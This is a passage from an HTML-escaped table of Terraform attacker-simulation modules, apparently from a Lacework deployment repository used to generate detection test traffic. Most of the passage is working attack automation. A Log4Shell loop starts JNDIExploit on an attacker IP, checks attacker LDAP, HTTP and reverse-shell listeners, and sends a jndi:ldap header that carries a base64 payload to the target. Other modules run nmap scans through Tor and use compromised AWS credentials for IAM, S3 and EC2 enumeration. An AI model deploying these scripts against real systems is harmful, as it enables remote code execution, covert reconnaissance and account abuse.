fi<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;setting up jndiexploit in screen session&#46;&#46;&#46;&quot;<br/>        if pgrep &#45;f &quot;JNDIExploit&quot;; then<br/>            kill &#45;9 $&&#35;40;pgrep &#45;f &quot;JNDIExploit&quot;&&#35;41;<br/>        fi<br/>        JNDIEXPLOIT&&#35;95;LOG=&quot;/tmp/jndiexploit&#46;log&quot;<br/>        for i in &&#35;96;seq $&&#35;40;&&#35;40;MAXLOG&#45;1&&#35;41;&&#35;41; &#45;1 1&&#35;96;; do mv &quot;$JNDIEXPLOIT&&#35;95;LOG&#46;&quot;&&#35;123;$i,$&&#35;40;&&#35;40;i&#43;1&&#35;41;&&#35;41;&&#35;125; 2&gt;/dev/null &#124;&#124; true; done<br/>        mv $JNDIEXPLOIT&&#35;95;LOG &quot;$JNDIEXPLOIT&&#35;95;LOG&#46;1&quot; 2&gt;/dev/null &#124;&#124; true<br/>        screen &#45;S jndiexploit &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile $JNDIEXPLOIT&&#35;95;LOG &#45;S jndiexploit &#45;m java &#45;jar JNDIExploit&#45;&&#35;42;&#46;jar &#45;&#45;ip $ATTACKER&&#35;95;IP &#45;&#45;httpPort 8088 &#45;&#45;ldapPort 1389<br/>        screen &#45;S jndiexploit &#45;X colon &quot;logfile flush 0^M&quot;<br/><br/>        log &quot;sleeping 15 minutes&#46;&#46;&#46;&quot;<br/>        sleep 900<br/>        log &quot;start services availability check&#46;&#46;&#46;&quot;<br/><br/>        log &quot;checking target: $TARGET&&#35;95;IP:$TARGET&&#35;95;PORT&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $TARGET&&#35;95;IP $TARGET&&#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for target: $TARGET&&#35;95;IP:$TARGET&&#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>                break<br/>            fi<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;target available&quot;;<br/>        log &quot;checking attacker ldap: $ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;LDAP&&#35;95;PORT&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $ATTACKER&&#35;95;IP $ATTACKER&&#35;95;LDAP&&#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for attacker ldap: $ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;LDAP&&#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>                break<br/>            fi<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker ldap available&quot;;<br/>        log &quot;checking attacker http: $ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;HTTP&&#35;95;PORT&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $ATTACKER&&#35;95;IP $ATTACKER&&#35;95;HTTP&&#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for attacker http: $ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;HTTP&&#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>                <br/>            fi<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker http available&quot;;<br/>        if &&#35;91; &quot;0&quot; &#33;= &quot;$REVERSE&&#35;95;SHELL&&#35;95;PORT&quot; &&#35;93;; then<br/>            log &quot;checking attacker reverse shell: $ATTACKER&&#35;95;IP:$REVERSE&&#35;95;SHELL&&#35;95;PORT&quot;<br/>            while &#33; nc &#45;z &#45;w 5 &#45;vv $ATTACKER&&#35;95;IP $REVERSE&&#35;95;SHELL&&#35;95;PORT &gt; /dev/null; do<br/>                log &quot;failed check &#45; waiting for attacker reverse shell: $ATTACKER&&#35;95;IP:$REVERSE&&#35;95;SHELL&&#35;95;PORT&quot;;<br/>                sleep 30;<br/>                if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>                    log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>                fi<br/>                if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                    log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                    rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                    break 2<br/>                fi<br/>            done;<br/>            log &quot;attacker reverse shell available&quot;;<br/>        fi<br/>        sleep 30;<br/>        if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;sending payload: curl &#45;&#45;verbose $TARGET&&#35;95;IP:$TARGET&&#35;95;PORT &#45;H &&#35;x27;X&#45;Api&#45;Version: &&#35;92;$$&&#35;123;jndi:ldap://$ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;LDAP&&#35;95;PORT/$EXEC&&#35;95;TYPE/$BASE64&&#35;95;PAYLOAD&&#35;125;&&#35;x27;&quot;<br/>        /bin/bash &#45;c &quot;curl &#45;&#45;verbose $TARGET&&#35;95;IP:$TARGET&&#35;95;PORT &#45;H &&#35;x27;X&#45;Api&#45;Version: &&#35;92;$$&&#35;123;jndi:ldap://$ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;LDAP&&#35;95;PORT/$EXEC&&#35;95;TYPE/$BASE64&&#35;95;PAYLOAD&&#35;125;&&#35;x27;&quot;<br/>        log &quot;done&quot;;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;git openjdk&#45;11&#45;jdk unzip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;git java&#45;11&#45;openjdk java&#45;11&#45;openjdk&#45;devel unzip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| attacker-ssm-execute-docker-nmap                                           | ./modules/ssm/execute-docker-nmap                              | ssm_exec_docker_nmap_attacker              | context.aws.ssm.attacker.execute.docker_nmap                              | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_nmap": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "ports": [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            "scan_local_network": false,<br/>                            "targets": [],<br/>                            "use_tor": true<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                              | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/nmap&quot;<br/>    attack&&#35;95;script = &quot;nmap&#46;sh&quot;<br/>    start&&#35;95;script = &quot;delayed&&#35;95;start&#46;sh&quot;<br/>    lock&&#35;95;file = &quot;/tmp/delay&&#35;95;nmap&#46;lock&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&#46;&#46;&#46;&quot;<br/>        LOCAL&&#35;95;NET=$&&#35;40;ip &#45;o &#45;f inet addr show &#124; awk &&#35;x27;/scope global/ &&#35;123;print $4&&#35;125;&&#35;x27; &#124; head &#45;1&&#35;41;<br/>        log &quot;LOCAL&&#35;95;NET: $LOCAL&&#35;95;NET&quot;<br/>        log &quot;Targets: $&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41;&&#35;125;&quot;<br/>        echo &quot;$&&#35;123; length&&#35;40;var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41; &gt; 0 ? join&&#35;40;&quot;&&#35;92;n&quot;, var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41; : &quot;$LOCAL&&#35;95;NET&quot; &&#35;125;&quot; &gt; /tmp/nmap&#45;targets&#46;txt<br/>        log &quot;Ports: $&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125;&quot;<br/>        if docker ps &#45;a &#124; grep $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;; then <br/>            docker stop $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>            docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>        fi<br/>        $&&#35;123; var&#46;inputs&&#35;91;&quot;use&&#35;95;tor&quot;&&#35;93; == true ? &lt;&lt;&#45;EOF<br/>        log &quot;Using tor network&#46;&#46;&#46;&quot;<br/>        if &#33; docker ps &#124; grep torproxy &gt; /dev/null; then<br/>        docker run &#45;d &#45;&#45;rm &#45;&#45;name torproxy &#45;p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$&&#35;40;docker inspect &#45;f &&#35;x27;&&#35;123;&&#35;123;range &#46;NetworkSettings&#46;Networks&&#35;125;&&#35;125;&&#35;123;&&#35;123;&#46;IPAddress&&#35;125;&&#35;125;&&#35;123;&&#35;123;end&&#35;125;&&#35;125;&&#35;x27; torproxy&&#35;41;<br/>        log &quot;Running via docker: proxychains nmap &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt&quot;<br/>        /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;e TORPROXY=$TORPROXY &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; nmap &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt &#124;&#124; true&quot; <br/>        /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        : &lt;&lt;&#45;EOF<br/>        log &quot;Running via docker: nmap &#45;Pn &#45;sS &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt&quot;<br/>        /bin/bash &#45;c &quot;docker run &#45;&#45;rm &#45;v /tmp:/tmp &#45;&#45;entrypoint=nmap &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt &#124;&#124; true&quot;<br/>        /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        &&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-ssm-execute-generate-aws-cli-traffic-attacker                     | ./modules/ssm/execute-generate-aws-cli-traffic                 | ssm_exec_generate_aws_cli_traffic_attacker | context.aws.ssm.attacker.execute.generate_aws_cli_traffic                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "generate_aws_cli_traffic": {<br/>                            "commands": [<br/>                                "x=10",<br/>                                "opts=\"--output json --color off --no-cli-pager\"",<br/>                                "while [ $x -gt 0 ]; do ",<br/>                                "log \"Running: aws sts get-caller-identity $opts\"",<br/>                                "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws iam list-users $opts\"",<br/>                                "aws iam list-users $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws s3api list-buckets $opts\"",<br/>                                "aws s3api list-buckets $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-instances $opts\"",<br/>                                "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",<br/>                                "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-volumes $opts\"",<br/>                                "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-vpcs $opts\"",<br/>                                "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",<br/>                                "x=$(($x-1))",<br/>                                "done"<br/>                            ],<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "profile": "aws-traffic"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre> | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-aws-cli-traffic                 | <pre>locals &&#35;123;<br/>    tool = &quot;aws&quot;<br/>    attack&&#35;95;dir = &quot;/generate&#45;aws&#45;cli&#45;traffic&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;echo &&#35;x27;$&&#35;123;k&#46;rendered&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;aws&#45;$&&#35;123;u&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    aws&&#35;95;commands = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for command in var&#46;inputs&&#35;91;&quot;commands&quot;&&#35;93;: &quot;$&&#35;123;command&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    source &#46;env&#45;aws&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;&&#35;125;<br/>    PROFILE=&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;profile&quot;&&#35;93;&&#35;125;&quot;<br/>    REGION=&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;&&#35;125;&quot;<br/>    aws configure set aws&&#35;95;access&&#35;95;key&&#35;95;id $AWS&&#35;95;ACCESS&&#35;95;KEY&&#35;95;ID &#45;&#45;profile=$PROFILE<br/>    aws configure set aws&&#35;95;secret&&#35;95;access&&#35;95;key $AWS&&#35;95;SECRET&&#35;95;ACCESS&&#35;95;KEY &#45;&#45;profile=$PROFILE<br/>    aws configure set region $REGION &#45;&#45;profile=$PROFILE<br/>    aws configure set output json &#45;&#45;profile=$PROFILE<br/>    log &quot;Running aws commands&#46;&#46;&#46;&quot;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        $&&#35;123;local&#46;aws&&#35;95;commands&&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &gt; /dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &gt; /dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              